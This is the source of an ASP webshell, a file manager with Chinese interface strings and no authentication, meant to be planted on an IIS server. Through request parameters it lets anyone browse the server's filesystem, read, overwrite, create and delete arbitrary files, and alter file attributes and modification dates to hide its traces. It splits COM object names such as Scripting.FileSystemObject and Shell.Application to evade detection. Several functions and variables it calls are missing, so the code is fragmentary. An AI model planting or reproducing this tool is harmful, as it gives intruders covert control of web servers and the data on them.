<%
'	Option Explicit

	Dim theAct, sTime, aspPath, pageName, strBackDoor, fsoX, saX

	sTime = Timer
	theAct= Request("theAct")
	pageName = Request("fuckasm")
	aspPath = Server.MapPath(".")


	Sub createIt(fsoX, saX, wsX)
		If isDebugMode = False Then
			On Error Resume Next
		End If

		Set fsoX = Server.CreateObject("Scripting.FileSy"&x&"stemObject")
		If IsEmpty(fsoX) And (pageName = "FsoFile"&x&"Explorer" Or theAct = "fsoSe"&x&"arch") Then
			Set fsoX = fso
		End If

		Set saX = Server.CreateObject("Shell.Ap"&x&"plication")
		If IsEmpty(saX) And (pageName = "AppFileExplorer" Or pageName = "Sa"&x&"CmdRun" Or theAct = "saSe"&x&"arch") Then
			Set saX = sa
		End If

	End Sub

	Sub echo(str)
		Response.Write(str)
	End Sub
	
	Function fixNull(str)
		If IsNull(str) Then
			str = " "
		End If
		fixNull = str
	End Function
	
	Function encode(str)
		str = Server.HTMLEncode(str)
		str = Replace(str, vbNewLine, "<br>")
		str = Replace(str, " ", "&nbsp;")
		str = Replace(str, "	", "&nbsp;&nbsp;&nbsp;&nbsp;")
		encode = str
	End Function
	
	Function getTheSize(theSize)
		If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G"
		If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M"
		If theSize >= 1024 And theSize < (1024 * 1024) Then getTheSize = Fix((theSize / 1024) * 100) / 100 & "K"
		If theSize >= 0 And theSize <1024 Then getTheSize = theSize & "B"
	End Function
	
	Function HtmlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		HtmlEncode = Server.HTMLEncode(str)
	End Function
	
	Function UrlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		UrlEncode = Server.UrlEncode(str)
	End Function
	
	Sub redirectTo(strUrl)
		Response.Redirect(Request.ServerVariables("URL") & strUrl)
	End Sub

	Function trimThePath(strPath)
		If Right(strPath, 1) = "\" And Len(strPath) > 3 Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		trimThePath = strPath
	End Function

	Sub alertThenClose(strInfo)
		Response.Write "<script>alert(""" & strInfo & """);window.close();</script>"
	End Sub

	Call createIt(fsoX, saX, wsX)

	Select Case pageName
		Case "PageList"
			PageList()
		Case "AppFileExplorer"
			PageAppFileExplorer()
		Case "FsoFileExplorer"
			PageFsoFileExplorer()
	End Select
	
	Set saX = Nothing
	Set fsoX = Nothing

	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	Rem 	Code By 深灰色
	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

	Sub PageAppFileExplorer()
		Response.Buffer = True
		Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
		Dim intI, theAct, strTmp, strFolderList, strFileList, strFilePath, strFileName, strParentPath

		theAct = Request("theAct")
		strNewName = Request("newName")
		thePath = Replace(LTrim(Request("thePath")), "\\", "\")
		

		
		Select Case theAct
			Case "openUrl"
				openUrl(thePath)
			Case "showEdit"
				Call showEdit(thePath, "stream")
			Case "saveFile"
				Call saveToFile(thePath, "stream")
			Case "theAttributes"
				appTheAttributes(thePath)
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		
		Set objFolder = saX.NameSpace(thePath)
		
		If Request.Form.Count > 0 Then
			redirectTo("?pageName=AppFileExplorer&thePath=" & UrlEncode(thePath))
		End If

		For Each objMember In objFolder.Items
			intI = intI + 1
			If intI > 200 Then
				intI = 0
				Response.Flush()
			End If
			
			If objMember.IsFolder = True Then
				If Left(objMember.Path, 2) = "::" Then
					strPath = URLEncode(objMember.Path)
				 Else
					strPath = URLEncode(objMember.Path) & "%5C"
				End If
				strFolderList = strFolderList & "<span id=""" & strPath & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>" & objMember.Name & "</span>"
			 Else
			 	strDetails = objFolder.GetDetailsOf(objMember, -1)
			 	strFilePath = objMember.Path
				strFileName = Mid(strFilePath, InStrRev(strFilePath, "\") + 1)
				strExtName = Split(strFileName, ".")(UBound(Split(strFileName, ".")))
				strFileList = strFileList & "<span title=""" & strDetails & """ ondblclick='openUrl();' id=""" & URLEncode(strFilePath) & """ onclick='changeMyClass(this);'><font class=font face=" & getFileIcon(strExtName) & "</font><br/>" & strFileName & "</span>"
			End If
		Next
		chkErr(Err)

		strParentPath = getParentPath(thePath)
		If thePath <> "" And Left(thePath, 2) <> "::" Then
			strFolderList = "<span id=""" & URLEncode(strParentPath) & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>..</span>" & strFolderList
		End If
		
		Set objFolder = Nothing
	End Sub
	
		Sub PageFsoFileExplorer()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Response.Buffer = True
		Dim file, drive, folder, theFiles, theFolder, theFolders
		Dim i, theAct, strTmp, driveStr, thePath, parentFolderName
		
		theAct = Request("theAct")
		thePath = Request("thePath")
		If theAct <> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Request.Form("thePath")
			End If
		End If
		
		Select Case theAct
			Case "showEdit"
				Call showEdit(thePath, "fso")
			Case "saveFile"
				Call saveToFile(thePath, "fso")
			Case "openUrl"
				openUrl(thePath)
			Case "delOne", "doDelOne"
				showFsoDelOne(thePath)
			Case "getAttributes", "doModifyAttributes"
				fsoTheAttributes(thePath)
			Case "downTheFile"
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		If Request.Form.Count > 0 Then
			redirectTo("?pageName=FsoFileExplorer&thePath=" & UrlEncode(thePath))
		End If
	End Sub

	Sub appTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, strSth, objFolder, objItem, strModifyDate
		strModifyDate = Request("ModifyDate")
		
		thePath = trimThePath(thePath)

		If thePath = "" Then
			alertThenClose("没有选择任何文件(夹)!")
			Exit Sub
		End If

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = saX.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)

		If isDate(strModifyDate) Then
			objItem.ModifyDate = strModifyDate
		echo fuckasm
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
'		strSth = objFolder.GetDetailsOf(objItem, -1)
'		strSth = Replace(strSth, chr(10), "<br/>")
		For i = 3 To 3
			strSth = strSth & "<br/>(" & i & ") " & objFolder.GetDetailsOf(objItem, i)
		Next
		strSth = Replace(strSth, "(3)", "")
		strSth = strSth & "<form method=post>"
		strSth = strSth & "<input type=hidden name=theAct value=theAttributes>"
		strSth = strSth & "<input type=hidden name=thePath value=""" & thePath & """>"
		strSth = strSth & "<br/>最后修改: <input size=30 value='" & objFolder.GetDetailsOf(objItem, 3) & "' name=ModifyDate />"
		strSth = strSth & "<input type=submit value=' 修改 '>"
		strSth = strSth & "</form>"
		echo strSth
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub

	Sub fsoNewOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theAct, isFile, theName, newAct
		isFile = Request("isFile")
		newAct = Request("newAct")
		theName = Request("theName")

		If newAct = " 确定 " Then
			thePath = Replace(thePath & "\" & theName, "\\", "\")
			If isFile = "True" Then
				Call fsoX.CreateTextFile(thePath, False)
			 Else
				fsoX.CreateFolder(thePath)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)新建成功,刷新后就可以看到效果!")
			Response.End
		End If
		
		echo "<style>body{overflow:hidden;}</style>"
		echo "<body topmargin=2>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>新建: "
		echo "<input type=radio name=isFile id=file value='True' checked><label for=file>文件</label> "
		echo "<input type=radio name=isFile id=folder value='False'><label for=folder>文件夹</label><br/>"
		echo "<input size=38 name=theName><hr/>"
		echo "<input type=hidden name=theAct value=doNewOne>"
		echo "<input type=submit name=newAct value=' 确定 '>" & strJsCloseMe
		echo "</form>"
		echo "</body><br/>"
	End Sub

	
	Sub showFsoDelOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile
		newAct = Request("newAct")

		If newAct = "确认删除?" Then
			If Right(thePath, 1) = "\" Then
				thePath = Left(thePath, Len(thePath) - 1)
				Call fsoX.DeleteFolder(thePath, True)
			 Else
				Call fsoX.DeleteFile(thePath, True)
			End If
			chkErr(Err)
			alertThenClose("文件(夹)删除成功,刷新后就可以看到效果!")
			Response.End
		End If

		echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"		
		echo "<form method=post><br/>"
		echo HtmlEncode(thePath)
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doDelOne>"
		echo "<hr/><input type=submit name=newAct value='确认删除?'><input type=button value=' 关闭 ' onclick='window.close();'>"
		echo "</form>"
	End Sub
	
		Sub fsoTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile, theFolder, theTitle
		newAct = Request("newAct")
		
		If Right(thePath, 1) = "\" Then
			Set theFolder = fsoX.GetFolder(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFolder)
			End If
				theTitle = getMyTitle(theFolder)
			Set theFolder = Nothing
		 Else
			Set theFile = fsoX.GetFile(thePath)
			If newAct = " 修改 " Then
				setMyTitle(theFile)
			End If
			theTitle = getMyTitle(theFile)
			Set theFile = Nothing
		End If
		
		chkErr(Err)
		theTitle = Replace(theTitle, vbNewLine, "<br/>")
		echo "<style>body{margin:8;overflow:hidden;}</style>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doModifyAttributes>"
		echo theTitle
		echo "<hr/><input type=submit name=newAct value=' 修改 '>" & strJsCloseMe
		echo "</form>"
	End Sub
	
	Function getMyTitle(theOne)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strTitle
		strTitle = strTitle & getAttributes(theOne.Attributes) 
		getMyTitle = strTitle
	End Function
	
	Sub setMyTitle(theOne)
		Dim i, myAttributes
		
		For i = 1 To Request("attributes").Count
			myAttributes = myAttributes + CInt(Request("attributes")(i))
		Next
		theOne.Attributes = myAttributes
		
		chkErr(Err)
		echo  "<script>alert('该文件(夹)属性已按正确设置修改完成!');</script>"
	End Sub
	
	Function getAttributes(intValue)
		Dim strAtt
		strAtt = "<input type=checkbox name=attributes value=4 {$system}>系统 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=2 {$hidden}>隐藏 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=1 {$readonly}>只读&nbsp;&nbsp;&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=32 {$archive}>存档<br/>　　&nbsp; "
		strAtt = strAtt & "<input type=checkbox name=attributes {$normal} value=0>普通 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=128 {$compressed}>压缩 "
		strAtt = strAtt & "<input type=checkbox name=attributes value=16 {$directory}>文件夹&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=64 {$alias}>快捷方式"
		If intValue = 0 Then
			strAtt = Replace(strAtt, "{$normal}", "checked")
		End If
		If intValue >= 128 Then
			intValue = intValue - 128
			strAtt = Replace(strAtt, "{$compressed}", "checked")
		End If
		If intValue >= 64 Then
			intValue = intValue - 64
			strAtt = Replace(strAtt, "{$alias}", "checked")
		End If
		If intValue >= 32 Then
			intValue = intValue - 32
			strAtt = Replace(strAtt, "{$archive}", "checked")
		End If
		If intValue >= 16 Then
			intValue = intValue - 16
			strAtt = Replace(strAtt, "{$directory}", "checked")
		End If
		If intValue >= 8 Then
			intValue = intValue - 8
			strAtt = Replace(strAtt, "{$volume}", "checked")
		End If
		If intValue >= 4 Then
			intValue = intValue - 4
			strAtt = Replace(strAtt, "{$system}", "checked")
		End If
		If intValue >= 2 Then
			intValue = intValue - 2
			strAtt = Replace(strAtt, "{$hidden}", "checked")
		End If
		If intValue >= 1 Then
			intValue = intValue - 1
			strAtt = Replace(strAtt, "{$readonly}", "checked")
		End If
		getAttributes = strAtt
	End Function
	
	Sub showEdit(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, unEditableExt
		
		unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"
		
		echo "<style>body{border:none;overflow:hidden;background-color:buttonface;}</style>"
		echo "<body topmargin=9>"
		echo "<form method=post style='margin:0;width:100%;height:100%;'>"
		echo "<textarea name=fileContent style='width:100%;height:90%;'>"
		If strMethod = "stream" Then
			echo (streamLoadFromFile(thePath))
		 Else
			Set theFile = fsoX.OpenTextFile(thePath, 1)
			echo (theFile.ReadAll())
			theFile.Close
			Set theFile = Nothing
		End If
		echo "</textarea><hr/>"
		echo "<div align=right>"
		echo "<input size=30 name=thePath value=""" & HtmlEncode(thePath) & """> "
		If Request.Cookies(m & "windowStatus") = "True" Then
			echo " checked"
		End If
		echo "<input type=submit value=' 保存 '><input type=hidden value='saveFile' name=theAct>"
		echo strJsCloseMe & "</div>"
		echo "</form>"
		echo "</body><br/>"
		
	End Sub
	
	Sub saveToFile(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fileContent, windowStatus
		fileContent = Request("fileContent")
		windowStatus = Request("windowStatus")
		
		If strMethod = "stream" Then
			streamSaveToFile thePath, fileContent
			chkErr(Err)
		 Else
			fsoSaveToFile thePath, fileContent
			chkErr(Err)
		End If
		
		If windowStatus = "on" Then
			Response.Cookies(m & "windowStatus") = "True"
			Response.Write "<script>window.close();</script>"
		 Else
			Response.Cookies(m & "windowStatus") = "False"
			Call showEdit(thePath, strMethod)
		End If
	End Sub
	
	Sub fsoSaveToFile(thePath, fileContent)
		Dim theFile
		Set theFile = fsoX.OpenTextFile(thePath, 2, True)
		theFile.Write fileContent
		theFile.Close
		Set theFile = Nothing
	End Sub
%>